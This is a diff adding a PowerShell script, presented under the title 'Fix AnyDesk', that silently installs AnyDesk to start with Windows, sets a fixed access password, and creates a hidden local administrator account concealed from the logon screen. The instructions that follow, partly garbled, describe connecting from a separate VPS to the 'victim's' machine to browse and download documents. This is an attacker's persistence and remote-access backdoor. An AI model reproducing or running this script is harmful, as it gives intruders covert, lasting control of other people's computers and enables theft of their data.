@@ -1,0 +1,40 @@
+Fix AnyDesk - see all
+ Function AnyDesk {
+
+    mkdir "C:\ProgramData\AnyDesk"
+    # Download AnyDesk
+    $clnt = new-object System.Net.WebClient
+    $url = "http://download.anydesk.com/AnyDesk.exe"
+    $file = "C:\ProgramData\AnyDesk.exe"
+    $clnt.DownloadFile($url,$file)
+
+
+    cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
+
+
+    cmd.exe /c echo J9kzQ2Y0qO | C:\ProgramData\anydesk.exe --set-password
+
+
+    net user oldadministrator "qc69t4B#Z0kE3" /add
+    net localgroup Administrators oldadministrator /ADD
+    reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v oldadministrator /t REG_DWORD /d 0 /f
+
+    cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id
+
+    }
+
+    AnyDesk
+
+Run the code in powershell ISE Run As Admin
+As a result, we get an ID
+Keep it to yourself
+On a separate dedicvpsvirtual download Anydesk specify the ID
+Click Console Account
+Enter your password
+Quote
+
+J9kzQ2Y0qO
+
+And then we log in with a local admin or domain account and use the charms of Anydesk
+You can also download / download to  s the victim's car, which is convenient in inspecting and searching for documentation point-by-point.
+
